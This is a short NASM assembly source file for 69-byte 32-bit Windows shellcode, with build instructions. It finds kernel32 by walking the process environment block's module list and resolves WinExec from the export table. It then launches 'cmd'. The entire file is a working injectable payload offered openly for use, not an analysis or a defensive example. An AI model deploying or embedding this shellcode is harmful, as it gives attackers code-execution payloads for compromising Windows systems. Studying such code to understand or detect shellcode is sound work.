
; 69 bytes WinExec shellcode
; odzhan
; nasm -fbin meh.asm -omeh.bin

      bits 32
      
      push   30h
      pop    ecx
      mov    eax, [fs:ecx]      ; eax = (PPEB) __readfsdword(0x30);
      mov    eax, [eax+0ch]     ; eax = (PPEB_LDR_DATA)peb->Ldr
      mov    esi, [eax+0ch]     ; esi = ldr->InLoadOrderModuleList.Flink
      lodsd
      mov    esi, [eax]
      mov    ebx, [esi+18h]     ; ebx = DllBase
      mov    eax, [ebx+3ch]     ; eax = IMAGE_DOS_HEADER.e_lfanew
      mov    eax, [ebx+eax+78h] ; IMAGE_EXPORT_DIRECTORY.VirtualAddress
      lea    esi, [ebx+eax+1ch] ; esi = offset IMAGE_EXPORT_DIRECTORY.AddressOfFunctions
      mov    cl, 3
L1:
      lodsd
      add    eax, ebx
      push   eax
      loop   L1
      pop    edx                ; edx = AddressOfNameOrdinals
      pop    esi                ; esi = AddressOfNames
      pop    edi                ; edi = AddressOfFunctions 
L2:
      movzx  ebp, word[edx+ecx*2]
      lodsd
      inc    ecx
      cmp    dword[eax+ebx], 'WinE'
      jne    L2     
      add    ebx, [edi+ebp*4]   ; ebx = base + AddressOfFunctions[ebp]
      mov    eax, ~'cmd'
      not    eax
      push   eax
      push   esp
      call   ebx
      
      
